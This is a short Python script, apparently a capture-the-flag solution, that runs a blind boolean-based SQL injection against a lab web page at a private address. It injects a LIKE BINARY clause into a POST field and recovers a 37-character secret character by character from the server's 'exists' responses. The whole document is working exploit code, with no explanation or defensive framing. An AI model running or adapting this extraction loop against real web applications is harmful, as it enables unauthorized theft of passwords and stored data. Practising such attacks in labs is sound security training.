import requests

url = "http://10.12.0.20/flag.php"
chars = r"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890{}"
password = ""
while len(password)<37:
    for uchar in chars:
            val = {"flag": "' OR value LIKE BINARY '"+password + uchar+ "%"}
            resp = requests.post(url,data = val)
            if "exists" in resp.text:
                password += uchar
                break
    
print(f"Flag for SQLinjection: {password}")